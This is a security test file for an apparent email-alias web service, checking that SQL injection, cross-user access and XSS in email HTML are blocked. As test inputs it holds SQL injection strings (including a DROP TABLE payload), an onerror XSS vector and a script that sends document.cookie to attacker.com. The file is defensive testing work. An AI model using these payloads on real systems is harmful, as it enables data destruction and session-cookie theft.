'use strict';
process.env.NODE_ENV='test';
process.env.DATABASE_PATH=':memory:';
process.env.INCOMING_SECRET='test-secret';
process.env.DOMAINS='test.example.com';
process.env.SESSION_SECRET='test-session-secret-32bytes-min!!';
process.env.JWT_SECRET='test-jwt-secret-32bytes-minimum!!';
process.env.SPAM_THRESHOLD_SCORE='5';
process.env.SPAM_BLOCK_SCORE='8';
process.env.MAX_EMAIL_SIZE='10485760';
process.env.BURNER_TTL_MINUTES='60';
process.env.EMAIL_TTL_DAYS='7';
process.env.ALIAS_TTL_DAYS='30';
process.env.MAX_ALIASES='5';
process.env.MAX_STORAGE_BYTES='104857600';
process.env.UPLOAD_DIR='/tmp/test-uploads-sec';
process.env.BACKUP_DIR='/tmp/test-backups';
process.env.LOG_DIR='/tmp/test-logs';
const request=require('supertest');
const express=require('express');
const{initDatabase,runMigrations,closeDatabase,getDb}=require('../../database/database');
let app,db,authToken;
beforeAll(async()=>{initDatabase();runMigrations();db=getDb();db.prepare("INSERT OR IGNORE INTO users(tg_id,username,role)VALUES(99999,'sectest','user')").run();const{createWebSession}=require('../../src/auth/sessions');const{rawToken}=createWebSession(99999,{userAgent:'test',ipAddress:'127.0.0.1'});authToken=rawToken;app=express();const{applySecurity}=require('../../src/middleware/security');applySecurity(app);app.use((req,res,next)=>{req.id='test';next();});app.use('/api/aliases',require('../../src/api/aliases'));app.use('/api/emails',require('../../src/api/emails'));});
afterAll(()=>closeDatabase());
describe('SQL Injection Prevention',()=>{
  test('alias search does not leak other users data',async()=>{db.prepare("INSERT OR IGNORE INTO users(tg_id)VALUES(88888)").run();db.prepare("INSERT OR IGNORE INTO aliases(address,tg_id,domain,alias_type)VALUES('victim@test.example.com',88888,'test.example.com','throwaway')").run();const r=await request(app).get("/api/aliases?search=' OR '1'='1").set('Authorization',`Bearer ${authToken}`);const addrs=(r.body.aliases||[]).map(a=>a.address);expect(addrs).not.toContain('victim@test.example.com');});
  test('email search with SQL injection is safe',async()=>{const r=await request(app).get("/api/emails?q='; DROP TABLE emails; --").set('Authorization',`Bearer ${authToken}`);expect(r.status).toBe(200);expect(()=>db.prepare('SELECT COUNT(*) FROM emails').get()).not.toThrow();});
});
describe('Authorization',()=>{
  test('unauthenticated request is rejected',async()=>{const r=await request(app).get('/api/aliases');expect(r.status).toBe(401);});
  test('user cannot access another users alias',async()=>{db.prepare("INSERT OR IGNORE INTO users(tg_id)VALUES(77777)").run();db.prepare("INSERT OR IGNORE INTO aliases(address,tg_id,domain,alias_type)VALUES('private@test.example.com',77777,'test.example.com','throwaway')").run();const r=await request(app).get('/api/aliases/private@test.example.com').set('Authorization',`Bearer ${authToken}`);expect(r.status).toBe(404);});
  test('user cannot delete another users alias',async()=>{const r=await request(app).delete('/api/aliases/private@test.example.com').set('Authorization',`Bearer ${authToken}`);expect(r.status).toBe(404);});
});
describe('XSS via Email Content',()=>{
  const{sanitizeEmailHtml}=require('../../src/email/sanitizer');
  test('script injection removed',()=>{const c=sanitizeEmailHtml('<b>Hello</b><script>document.location="https://attacker.com/?c="+document.cookie</script>');expect(c).not.toContain('<script');expect(c).not.toContain('document.cookie');});
  test('img onerror removed',()=>{const c=sanitizeEmailHtml('<img src="x" onerror="alert(1)">');expect(c).not.toContain('onerror');});
});
